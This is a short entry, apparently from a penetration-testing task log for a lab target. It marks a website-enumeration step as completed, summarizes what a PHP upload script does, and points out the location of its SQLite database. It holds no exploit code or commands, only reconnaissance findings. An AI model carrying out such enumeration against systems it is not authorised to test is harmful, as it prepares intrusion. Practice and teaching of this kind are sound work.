   1.9 Further Enumerate the website - [completed] {The PHP script checks if a user session exists. If a session exists, it connects to an SQLite database located at /var/db/pilgrimage. It prepares an SQL statement to insert into the 'images' table the URL, original file name, and username. If the execution is successful, it redirects to a success page; otherwise, it redirects to a failure page. If a user session does not exist, it directly redirects to a failure page. The location of the SQLite database is /var/db/pilgrimage.}
